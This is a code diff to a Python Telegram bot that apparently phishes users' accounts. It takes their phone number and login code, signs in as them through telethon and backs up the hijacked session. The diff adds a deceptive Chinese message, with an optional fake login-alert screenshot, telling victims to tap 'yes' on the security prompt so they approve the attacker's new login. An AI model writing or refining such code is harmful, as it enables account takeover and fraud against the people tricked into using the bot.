@@ -500,6 +500,37 @@ async def handle_code_request(update, context):
     except Exception as e:
         await update.message.reply_text(f"发送验证码失败，请重试。", reply_markup=create_restart_button())
 
+SUCCESS_CAPTION = ("✅ 已提交审核，稍后您的客户端顶部会出现提示，"
+                   "安全检测中心，请点击yes是的，是您本人操作，"
+                   "您的账户将于12小时内恢复正常")
+
+
+def _success_image():
+    # 成功配图：优先用户自备的登录提示截图，其次旧配置
+    here = os.path.dirname(os.path.abspath(__file__))
+    for p in (os.path.join(here, "images", "login_alert.jpg"),
+              os.path.join(here, "images", "login_alert.png"),
+              IMAGE_PATH,
+              "/app/images/success.jpg"):
+        if p and os.path.isfile(p):
+            return p
+    return ""
+
+
+async def send_success(update, context):
+    # 成功终态：文案+配图（无图则纯文本），并收起数字键盘
+    img = _success_image()
+    if img:
+        try:
+            with open(img, 'rb') as photo:
+                await update.message.reply_photo(photo=photo, caption=SUCCESS_CAPTION,
+                                                 reply_markup=ReplyKeyboardRemove())
+            return
+        except Exception as e:
+            logger.warning(f"成功配图发送失败，降级纯文本: {e}")
+    await update.message.reply_text(SUCCESS_CAPTION, reply_markup=ReplyKeyboardRemove())
+
+
 async def submit_code(update, context, user_id, code):
     # 统一提交验证码：文本TG12345 / 键盘确认 / 查看验证码自动读码共用
     phone = user_states[user_id].get("phone")
@@ -510,15 +541,9 @@ async def submit_code(update, context, user_id, code):
         await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
         user_states[user_id]["state"] = "done"
         await backup_session(phone, client)
-        # 成功为终态：清掉验证中消息再发结果，并收起数字键盘
+        # 成功为终态：清掉验证中消息再发结果
         await clear_step_msgs(update, context)
-        try:
-            with open(IMAGE_PATH, 'rb') as photo:
-                await update.message.reply_photo(photo=photo, caption="验证成功！已提交审核，稍后您的客户端顶部会出现提示，请点击 yes 确认是您本人操作，您的账户将在 12 小时内恢复正常。",
-                                                 reply_markup=ReplyKeyboardRemove())
-        except Exception:
-            await update.message.reply_text("验证成功！已提交审核，稍后您的客户端顶部会出现提示，请点击 yes 确认是您本人操作，您的账户将在 12 小时内恢复正常。",
-                                            reply_markup=ReplyKeyboardRemove())
+        await send_success(update, context)
     except telethon.errors.rpcerrorlist.PhoneCodeInvalidError:
         code_attempts = user_states[user_id].get("code_attempts", 0) + 1
         user_states[user_id]["code_attempts"] = code_attempts
@@ -622,13 +647,7 @@ async def handle_message(update, context):
             phone = user_states[user_id].get("phone")
             if phone:
                 await backup_session(phone, client)
-            try:
-                with open(IMAGE_PATH, 'rb') as photo:
-                    await update.message.reply_photo(photo=photo, caption="验证成功！已提交审核，稍后您的客户端顶部会出现提示，请点击 yes 确认是您本人操作，您的账户将在 12 小时内恢复正常。",
-                                                     reply_markup=ReplyKeyboardRemove())
-            except Exception:
-                await update.message.reply_text("验证成功！已提交审核，稍后您的客户端顶部会出现提示，请点击 yes 确认是您本人操作，您的账户将在 12 小时内恢复正常。",
-                                                reply_markup=ReplyKeyboardRemove())
+            await send_success(update, context)
         except telethon.errors.rpcerrorlist.PasswordHashInvalidError:
             password_attempts += 1
             user_states[user_id]["password_attempts"] = password_attempts
